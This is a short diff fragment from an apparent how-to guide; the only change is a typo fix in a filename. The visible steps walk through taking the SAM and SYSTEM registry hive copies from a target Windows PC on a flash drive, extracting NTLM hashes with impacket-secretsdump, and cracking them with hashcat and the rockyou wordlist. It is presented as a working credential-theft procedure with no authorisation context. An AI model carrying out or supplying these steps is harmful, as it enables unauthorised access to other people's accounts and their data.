@@ -28,7 +28,7 @@ make sure you have access to your target pc.
 - del sys.save
 after saving the file eject the flash drive and plug it your pc.(make sure everything is ready)
 3. move sam.save and sys.save from flash drive to pc
-4. open your gui file system then go into /usr/share/wordlists/rockyou.txt.gz and move rockyou.txt into the same dir as sam.save and sys,save
+4. open your gui file system then go into /usr/share/wordlists/rockyou.txt.gz and move rockyou.txt into the same dir as sam.save and sys.save
 5. in interminal cd into the dir that contain those file:
 - impacket-secretsdump -sam sam.save -system sys.save (then copy the hash of the user which is the 'y' then paste in a new file hashes.txt. example:{user10:::xxxxxxxxxxxxxxxxxxxxxxxxx:yyyyyyyyyyyyyyyyyyyyyy:::})
 - sudo hashcat -m 1000 hashes.txt rockyou.txt
